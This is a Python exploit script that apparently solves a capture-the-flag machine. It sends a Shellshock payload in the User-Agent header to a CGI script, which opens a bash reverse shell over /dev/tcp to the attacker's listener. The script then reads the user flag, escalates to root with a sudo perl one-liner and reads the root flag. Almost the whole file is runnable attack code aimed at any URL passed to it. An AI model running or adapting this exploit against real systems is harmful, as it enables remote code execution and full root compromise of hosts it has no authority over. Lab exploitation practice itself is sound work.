import requests
from urllib.parse import quote
import argparse
import socket
import telnetlib
from threading import Thread
import re
import urllib3  
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

session = requests.Session()
session.verify = False

class Interface:
    def __init__(self):
        self.red = "\033[91m"
        self.green = "\033[92m"
        self.white = "\033[37m"
        self.yellow = "\033[93m"
        self.bold = "\033[1m"
        self.end = "\033[0m"

    def info(self, message):
        print(f"({self.white}*{self.end}) {message}")

    def warning(self, message):
        print(f"({self.yellow}!{self.end}) {message}")

    def error(self, message):
        print(f"({self.red}x{self.end}) {message}")

    def success(self, message):
        print(f"({self.green}✓{self.end}) {self.bold}{message}{self.end}")

def send_get(url, headers={}, cookies={}):
    request = session.get(url, headers=headers, cookies=cookies, allow_redirects=False)
    return request

def exec_code(lport):
    handlerthr = Thread(target=handler, args=(lport,))
    handlerthr.start()

def handler(lport):
    flag_data = ""
    flag_data2 = ""
    flag_pattern = "[0-9a-f]{32}"
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", int(lport)))
    s.listen(1)
    conn, addr = s.accept()
    t.sock = conn
    t.sock.send(b"cat /home/shelly/user.txt\n")
    for i in range(3):
        flag_data = flag_data + t.sock.recv(2048).decode()
    output.success("User flag: " + flag_data.split("\n")[2])

    t.sock.send(b'''sudo perl -e 'exec "/bin/bash";'\n''')
    t.sock.send(b"cat /root/root.txt\n")
    for i in range(3):
        flag_data2 = flag_data2 + t.sock.recv(2048).decode()
    output.success("Root flag: " + flag_data2.split("\n")[1])
    
    

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-u", "--url", help="Target ip address or hostname", required=True
    )
    parser.add_argument(
        "-l", "--lhost", help="Listening IP address for reverse shell", required=True
    )
    parser.add_argument(
        "-p", "--lport", help="Listening port for reverse shell", required=True
    )
    parser.add_argument(
        "-d",
        "--debug",
        help="Instruct our web requests to use our defined proxy",
        action="store_true",
        required=False,
    )
    args = parser.parse_args()

    target_url = args.url
    listen_host = args.lhost
    listen_port = args.lport
    if args.debug:
        session.proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080",
        }

    global output
    output = Interface()
    exec_code(listen_port)
    send_get(target_url + "/cgi-bin/user.sh",{"User-Agent": "() { :;}; /bin/bash -i >& /dev/tcp/" + listen_host + "/" + listen_port + " 0>&1;"})
    
